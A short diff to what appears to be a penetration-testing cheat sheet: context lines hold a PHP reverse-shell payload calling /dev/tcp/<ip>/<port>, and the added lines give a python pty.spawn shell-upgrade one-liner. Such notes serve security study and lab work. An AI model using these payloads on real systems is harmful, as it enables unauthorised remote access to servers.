@@ -36,6 +36,8 @@ exiftool <bild.png>
     <?php
     exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
     ?>
+### must be run from a terminal
+	python -c 'import pty;pty.spawn("/bin/bash");'
 
 
 ## Else
